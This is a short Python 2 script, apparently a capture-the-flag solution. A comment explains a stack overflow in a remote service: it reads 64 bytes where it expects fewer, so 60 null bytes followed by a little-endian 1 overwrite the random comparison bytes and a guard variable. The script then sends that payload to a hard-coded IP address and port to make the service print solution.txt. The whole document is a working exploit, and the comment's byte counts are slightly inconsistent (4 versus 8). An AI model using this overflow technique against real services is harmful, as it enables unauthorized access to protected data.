import socket

'''
The program reads 8 bytes from /dev/urandom and
compares it with your input, which is nearly impossible to match

The only way to make the program to read the solution.txt and print it
is to make true the following condition:

strncmp(your_input, {8 bytes from /dev/urandom}, 8) == 0 && var == 1

where var is a variable declared as var = 0

The secret resides in the way that the program reads your output,
while it only compares the first 4 bytes, it reads a total of 64 bytes,
enough for overwritting both the bytes read from urandom and changing
the var value to 1 (little endian).
'''

host = "52.49.91.111"
port = 9999

pattern = '\x00' * 60 + '\x01\x00\x00\x00'
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
print client.recv(1024)
client.send(pattern)
print client.recv(1024)
client.close()
